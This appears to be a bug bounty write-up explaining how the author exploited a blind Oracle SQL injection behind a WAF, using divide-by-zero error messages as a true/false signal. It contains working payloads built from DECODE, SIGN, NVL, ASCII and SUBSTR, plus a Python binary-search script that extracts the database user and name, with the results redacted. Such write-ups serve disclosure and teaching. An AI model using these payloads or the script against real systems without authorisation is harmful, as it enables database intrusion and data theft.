# Dividing by Zero for SQLi

## Summary

I found a blind SQL injection on a VDP, behind an aggressive WAF that blocked every normal SQLi payload I tried. The page did return database errors though, and dividing a parameter by `1` or by `0` gave 2 different ones. By making the database pick the divisor based on a condition, those 2 errors became `true` and `false`. Using this, I could read the database user and database name one character at a time without using a single quote or SQL keyword.

## Two Errors

The page took a number in a `val` parameter. I tried the usual things first: `'`, `AND`, `OR`, `SELECT`, `UNION`. All of them were blocked by a WAF before they reached the application.

As I was about to move on, I thought to try arithmetic for fun, since it was something I had tested before in other programmes. Setting `val` to `1/1` and `1/0` returned different errors:

| Value | Error |
| --- | --- |
| `1/1` | `invalid number` |
| `1/0` | `divisor is equal to zero` |

Errors returned for each value of `val`

These are **Oracle** error messages. The second one only makes sense if the database is actually evaluating `1/0`, so whatever I put in `val` was ending up inside a query. That meant there was a good chance of SQLi.

## Bypassing the WAF

The WAF was essentially blocking quotes, semicolons and keywords like `UNION SELECT`. However, it allowed maths and function calls, and as it turned out, that's enough.

The trick here is to somehow use the 2 errors to be my `true` and `false` statements. If I can make the database divide by `1` when a condition is true and by `0` when it's false, the error tells me the answer.

Oracle's [`DECODE()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/DECODE.html) function does exactly this. It's a compact if-else, returning different results based on evaluating whether `value = match`:

```sql
DECODE(value, match, result_if_equal, default_result)
```

`DECODE(1, 1, 1, 0)` returns `1` because `1 == 1`, and `DECODE(5, 1, 1, 0)` returns `0` because `5 != 1`. Since it only returns `1` or `0`, it can be used as the **divisor** like so:

```sql
1 / DECODE(<condition>, 1, 1, 0)
```

The payload always ends up as one of the 2 values I tested by hand:

| Condition | Query becomes | Error |
| --- | --- | --- |
| `1` | `1/1` | invalid number |
| Anything else | `1/0` | divisor is equal to zero |

How the condition picks the divisor

So `invalid number` means **true** and `divisor is equal to zero` means **false**. There are no quotes or blocked keywords anywhere in it, so this passes the WAF.

## Reading the User

Now I need a condition that asks a question about the data. A normal blind SQLi uses the [`ASCII()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/ASCII.html) and [`SUBSTR()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/SUBSTR.html) functions to take characters out one at a time. `SUBSTR()` picks a character out of a string, and `ASCII()` turns that character into a number. Here, I used them with 2 more functions, `NVL()` and `SIGN()`.

[`NVL()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/NVL.html) replaces a `NULL` value with something else:

```sql
NVL(expr1, expr2)
```

If `expr1` is **`NULL`**, it returns `expr2`. Otherwise, it returns `expr1` as it is:

```sql
NVL(65, 0)    -- 65
NVL(NULL, 5)  -- 5
```

This handles the end of a string. If I ask for position `6` of a 5-character username, `SUBSTR()` returns `NULL`, so `ASCII()` returns `NULL` too. `NVL()` turns that into `0`, which tells me the string has ended.

[`SIGN()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/SIGN.html) returns the sign of a number:

```sql
SIGN(n)
```

It returns `-1` if `n` is less than `0`, `0` if `n` is `0`, and `1` if `n` is greater than `0`:

```sql
SIGN(-12)  -- -1
SIGN(0)    -- 0
SIGN(12)   -- 1
```

If I subtract a guess from a character's ASCII number, `SIGN()` returns `1` only when the character is **greater than my guess** as it is a positive number.

Combining all of them, a query to guess the first character of [`USER`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/USER.html), the database user the application logs in as, looks like this:

```sql
SIGN(NVL(ASCII(SUBSTR(USER, 1, 1)), 0) - 77)
```

This then goes into `DECODE()` as the condition, so that the divisor is `1` only when the first character is greater than `77`:

```sql
1 / DECODE(SIGN(NVL(ASCII(SUBSTR(USER, 1, 1)), 0) - 77), 1, 1, 0)
```

Using a made-up username of `ADMIN` as the example, the first character is `A`, which is `65` in ASCII. With a guess of `77`, the payload works out like this:

| Part | What it does | Result |
| --- | --- | --- |
| `ASCII(SUBSTR(USER, 1, 1))` | Returns the ASCII value of the first character of `USER` | `65` |
| `NVL(65, 0)` | Returns `0` if the value is `NULL`, otherwise the value | `65` |
| `SIGN(65 - 77)` | Returns the sign of `-12` | `-1` |
| `DECODE(-1, 1, 1, 0)` | Returns `1` if the value is `1`, otherwise `0` | `0` |
| `1 / 0` | Divides by the result | divisor is equal to zero |

A guess of `77` for `ADMIN`

`A` is not greater than `77`, so the page divides by `0` and I get `divisor is equal to zero`, which means **false**.

With a guess of `60` instead, only the last 3 steps change:

| Part | What it does | Result |
| --- | --- | --- |
| `SIGN(65 - 60)` | Returns the sign of `5` | `1` |
| `DECODE(1, 1, 1, 0)` | Returns `1` if the value is `1`, otherwise `0` | `1` |
| `1 / 1` | Divides by the result | invalid number |

A guess of `60` for `ADMIN`

`A` is greater than `60`, so the page divides by `1` and I get `invalid number`, which means **true**. Between the 2 guesses, I now know the first character is somewhere from `61` to `77`.

Since each request is a "greater than" question, I can binary search instead of guessing every character. ASCII values here go from `0` to `126`, so each character takes about 7 requests.

## The Script

This is the idea behind the script I used, simplified:

```python
def is_true(condition):
    response = send(f"1/DECODE({condition},1,1,0)")
    return "invalid number" in response  # divided by 1

def get_char(expr, pos):
    # Binary search for the ASCII value of the character at pos
    low, high = 0, 126
    while low < high:
        mid = (low + high) // 2
        if is_true(f"SIGN(NVL(ASCII(SUBSTR({expr},{pos},1)),0)-{mid})"):
            low = mid + 1
        else:
            high = mid
    return low  # 0 means the string has ended

def extract(expr):
    result = ""
    pos = 1
    while (value := get_char(expr, pos)) != 0:
        result += chr(value)
        pos += 1
    return result


print("USER:", extract("USER"))
print("DB:  ", extract("ORA_DATABASE_NAME"))
```

It pulled out the current user first and then the database name, one character at a time.

```text
[*] Extracting USER...
[+] USER: X
[+] USER: XX
...
[+] USER: XXXXXXXX_ADMIN

[*] Extracting database name...
[+] DB: X
[+] DB: XX
...
[+] DB: XXXXXXXX

========== RESULT ==========
USER: XXXXXXXX_ADMIN
DB:   XXXXXXXX
```

Getting a real username back ending in `_ADMIN` showed that the blind SQLi worked.

## Impact

This issue was pretty cool, since it was about totally circumventing the WAF using a simple divide by zero error along with built-in Oracle functions. By demonstrating the extraction of the database name and user, it was deemed valid and was triaged as a **High** issue.

The WAF blocked every payload that looked like SQL injection, but `1/0` doesn't look like one. With the database telling me which of the 2 errors it hit, division was all I needed.

## References

**Oracle SQL functions**

- [DECODE](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/DECODE.html), Oracle Database SQL Language Reference
- [NVL](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/NVL.html), Oracle Database SQL Language Reference
- [SIGN](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/SIGN.html), Oracle Database SQL Language Reference
- [SUBSTR](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/SUBSTR.html), Oracle Database SQL Language Reference
- [ASCII](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/ASCII.html), Oracle Database SQL Language Reference
- [USER](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/USER.html), Oracle Database SQL Language Reference
